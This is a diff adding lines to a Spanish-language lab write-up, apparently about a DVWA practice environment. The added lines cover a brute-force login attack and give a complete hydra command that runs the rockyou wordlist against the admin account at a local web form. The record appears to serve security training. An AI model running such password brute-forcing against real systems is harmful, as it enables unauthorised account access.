@@ -13,3 +13,9 @@ aqui vemo como da correcto en todos pero no es verdad lo que nos tenemos que fij
 y aqui comprobamos como me ha dejado entrar 
 ![alt text](image-3.png)
 
+ahora vamos a hacer un ataque de fuerza bruta con hydra
+y nos saldra todas las contraseñas para admin
+hydra -l admin -P /home/alvaro/rockyou\(1\).txt "http-get-form://172.17.0.2/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=submit:Username and/or password incorrect."
+
+![image](https://github.com/user-attachments/assets/09bf6185-e11c-4f9f-9a91-a26397e2f1da)
+
